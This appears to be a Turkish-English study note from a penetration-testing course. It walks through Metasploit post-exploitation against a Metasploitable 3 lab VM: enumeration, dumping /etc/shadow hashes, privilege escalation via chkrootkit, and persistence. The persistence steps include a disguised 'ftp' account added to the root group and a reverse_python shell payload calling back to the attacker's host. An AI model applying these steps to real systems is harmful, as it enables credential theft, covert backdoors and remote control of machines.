### Senaryo gereği biz kali'den metasploitable 3'e bir tane reverse.elf attık. LPORT 5555 meterpreter shelli'mizi aldık

---
### #post-exploitation-linux 
### #post-exploitation-linux-enumeration
### #post-exploitation-enum 

+ We can utilize post exploitation modules to enumerate information about the Linux system we currently have access to:
## Enumerate system configuration
### Distribution Release -- cat /etc/os-release
## Enumerate environment variables
## Enumerate network configuration
## VM check
## Enumerate user history


---
## Linux Privilege Escalation: Exploiting A Vulnerable Program

The privilege escalation techniques we can utilize will 
### depend on the v<span style="background:#d4b106">ersion of the Linux kernel running on the target system</span> as well as the distribution release version.
+ MSF offers very little in regards to Linux kernel exploit modules, however, in some cases, there may be an exploit module that can be utilized to exploit a vulnerable service or program in order to elevate our privileges.

---

### Hedefe Varolan Açıklardan bir tanesi ile erişim sağladık.

## Şimdi Sıra Local Enum Zamanı

### 1. getuid
### 2. sysinfo
### 3. ifconfig
![[Pasted image 20240314235714.png]]
### 4. cat /etc/os-release
### 4. cat /etc/*issue
![[Pasted image 20240315000242.png]]
![[Pasted image 20240314235504.png]]
![[Pasted image 20240314235548.png]]


---

## shell komutuyla artık local enum devam edecek
### /bin/bash -i

![[Pasted image 20240315000016.png]]
### 5. whoami
### 6.  cat /etc/passwd
![[Pasted image 20240315000332.png]]
### 7. cat /etc/*issue

### 8.  uname -a
![[Pasted image 20240315000413.png]]

### 9. uname -r
![[Pasted image 20240315000514.png]]
### 10. ip a s
![[Pasted image 20240315000553.png]]
#### Bu "<span style="background:#d4b106">ip a s</span>" malum olduğu üzere PIVOTING #pivoting için çok önemli. 
### Hangi ağlara bağlıyız, nasıl lateral movement yaparız hepsi buna bağlı.

## HEDEF HANGİ PORTLARI DİNLİYOR

### 11. netstat -antp
![[Pasted image 20240315000932.png]]


### 12. ps aux
![[Pasted image 20240315001026.png]]

### 13. env
##### environment variables bunları ortaya koyar ve belki bir programı exploit edip kendimizi bu env'e dahil edebiliyorsak o program çalışmadan bizim malicious kodumuzu çalıştırabiliriz.
![[Pasted image 20240315001228.png]]

## Sistemin baktığı binary PATH'i
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin




----

## 13. search enum_configs
![[Pasted image 20240315001545.png]]
### #post-exploitation-linux 
### post/linux/gather/enum_configs
![[Pasted image 20240315001747.png]]
##### Bu modul sadece common config dosyalarını buluyor ki bunlar üzerinde enum yapmaya devam edip exploit bulmamız için.


### eğer sade temiz bir workspace açtıysan msfconsole sana temiz bir şekilde #loot loot komutuyla elde ettiği zaafiyetleri nereye kaydettiğini gösterecektir.
## loot
![[Pasted image 20240315002129.png]]
### loot komutuyla elde edilenler
![[Pasted image 20240315002451.png]]

## 14. search post type:post                    platform:linux env

### search platform:linux env type:post

![[Pasted image 20240315002752.png]]

---
#### ÇOK ÖNEMLİ
## Local Olarak Network Enum Yapamazsak
### msfconsole network enum var

### search enum_network

![[Pasted image 20240315003317.png]]
### Bu enum bize bir sürü bilgi verdi örneğin "SSH keys stored in"

SSH keys stored in /root/.msf4/loot/20240318042100_default_10.0.2.8_linux.enum.netwo_152625.txt


## Protection System'lere bakacağız

### search enum_protections

![[Pasted image 20240318113114.png]]

![[Pasted image 20240318114130.png]]

----

## System üzerine post enum yapacağız
### search enum_system
![[Pasted image 20240318114456.png]]

### Installed Packages önemli burada hangi paketler yüklenmiş bunları sıralar

----

## checkcontainer
![[Pasted image 20240318120757.png]]

---
## enum_users_history
![[Pasted image 20240318121123.png]]
![[Pasted image 20240318121144.png]]


###  Bu users'ın history file kontrol etmek çok öenmli çünkü bazen kullanıcılar kopyala yapıştır yapıyorlar passwords'leri burada direk çekebiliriz


---

## Hash Dump - - Linux
+ We can dump Linux user hashes with the hashdump post exploitation module.
+ <span style="background:#d4b106">Linux password hashes are stored in the /etc/shadow</span> file and can only be accessed by the root user or a user with root privileges.
+ The hashdump module can be used to dump the user account hashes from the /etc/shadow file and can also be used to --->
### #unshadow the hashes for password cracking with #john-the-ripper.


---
### meterpreter kullanırken hash dump modulunu dışarıdan yuklememiz gerekir.
#### meterpreter session ile sisteme erişim sağladık

![[Pasted image 20240318123022.png]]
### vagrant user da sudo su yaparsan direk root olur
## Hashdump yapabilmek için root kullanıcısı olduk
![[Pasted image 20240318123256.png]]
![[Pasted image 20240318123702.png]]

### search post linux hashdump
use 0
set sessions 2
run
![[Pasted image 20240318123845.png]]
![[Pasted image 20240318123902.png]]
### Bu bize root yetkisinde olduğumuz için /etc/shadow içindeki bütün kullanıcı ve hash'lerini verdi.

## unshadowedfile burada /root/.msf4/loot/20240318054118_default_10.0.2.8_linux.hashes_052178.txt

## $ bu aradaki numara  neyse $ 
### 1    SHA-1
### 3-5  SHA-256
### 6    SHA- 512
## Hash algoritması odur.


---
## Establishing Persistence On Linux
#persistence-linux
Persistence consists of techniques that adversaries use to keep access to systems across <span style="background:#d4b106">restarts</span>, <span style="background:#d4b106">changed credentials</span>, and <span style="background:#d4b106">other interruptions that could cut off</span>
<span style="background:#d4b106">their access</span>.
###  Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.
## The persistence techniques we can utilize will depend on the target configuration.
### We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.

---

>[!warning] Şimdi Linux da çok fazla distrubution oluduğu için burada hedef sistemin distrosuna dikkat etmek çok önemli çünkü persistence için config file.lar kullanılacak hepsinde farklı yerde farklı özellikte olabilir config file.



---

#chkrootkit
### SSH key ile hedef sisteme erişim sağlayıp #chkrootkit ile erişim sağlanılacak.


### search ssh_login
## buraya daha önce hash'lerini aldığımız credentials'i yazıyoruz ve normal session aldığımızdada session -u 4
### yapıp meterpreter shell'e çeviriyoruz.

---

### search #chkrootkit 
#### bu modul unix için düzenlenmiş bir root kit ve bununla priv esc yapılıyor.

![[Pasted image 20240318132248.png]]

---

### Root user olarak yetkimizi aldık biz şimdi persistence yapacağız.

## 1. teknik Manuel olarak PAYLOAD yükleme
#### ÖNEMLİ
### Bu teknik sadece SSH çalıştırıyorsa ve REMOTE ACCESS PROTOCOL çalışıyorsa gerçekleşir.

## clandestine  olabildiğinde gizli olmalı bu yapılacak işlem.

### cat /etc/passwd çalıştırdık
![[Pasted image 20240318133104.png]]

### Burada tespit edilmesi çok zor bir username seçmeliyiz.

## Alexis'in tavsiye ettiği bir service account oluşturmak. Çünkü tespit edilmesi çok zorlaşıyor.

### - `useradd` komutu, sistemde yeni bir kullanıcı oluşturmak için kullanılır.
- `-m` seçeneği, kullanıcının ana dizinini otomatik olarak oluşturmasını sağlar. Bu durumda, ana dizin `/home/ftp` olacaktır.
- `-s` seçeneği, kullanıcının kabuğunu belirler. Bu durumda, kabuk `/bin/bash` olarak ayarlanır.
- `useradd` komutu, sistemde yeni bir kullanıcı oluşturmak için kullanılır.
- `-m` seçeneği, kullanıcının ana dizinini otomatik olarak oluşturmasını sağlar. Bu durumda, ana dizin `/home/ftp` olacaktır.
- `-s` seçeneği, kullanıcının kabuğunu belirler. Bu durumda, kabuk `/bin/bash` olarak ayarlanır.
### burada home directory de oluşturulması çok önemli SSH bağlantısı ile erişim sağlayacağımız için.
## İsmini de ftp olarak biz koyduk ftp service account olarak gözükmesi ve tespit edilememesi için

![[Pasted image 20240318133940.png]]
![[Pasted image 20240318133920.png]]
### ftp 'te passwd atadık şimdi tam gerçekçi olması için

![[Pasted image 20240318134106.png]]
![[Pasted image 20240318134119.png]]

## Bu ftp'yi root group'a dahil etmemiz gerekiyor.
![[Pasted image 20240318134306.png]]
## usermod -aG root ftp
![[Pasted image 20240318134359.png]]
![[Pasted image 20240318134424.png]]
### groups ftp
![[Pasted image 20240318134612.png]]

#### <span style="background:#d4b106"> Bu aşamaları biz ne zaman istersek legitimate olarak ssh ile root yetkisiyle girebilmek için yapıyoruz.</span>

### usermode - u 15 ftp
![[Pasted image 20240318135224.png]]
### bunu yaptık çünkü şimdi üretilmiş gibi gözükmemesi için

### search linux persistence 
![[Pasted image 20240318135756.png]]
### use 0
#### Bu module de multi/handler ayaklandırman gerekiyor ki dinleyiciden shell alabilesin

----

### Cronjob setup module
## use 3


---

## Service Persistence Module
![[Pasted image 20240318232627.png]]
set payload cm/unix/reverse_python
set Lport 4748
set Lhost 10.0.2.4
set sessions 4
## run

![[Pasted image 20240318234129.png]]
### Bu çalışıyor.


---

## search linux persistence
### post/linux/manage/sshkey_persistence 
![[Pasted image 20240318234300.png]]


---

post/linux/manage/sshkey_persistence 

---
---


## #Armitage
+ Armitage is a free Java based GUI front-end for the Metasploit Framework developed by Raphael Mudge and is used to simplify network discovery, exploitation and post exploitation.

![[Pasted image 20240319104203.png]]

### Her seferinde 1 işlem yapmaya çalış JAVA ile üretildiği için yavaşlatır.








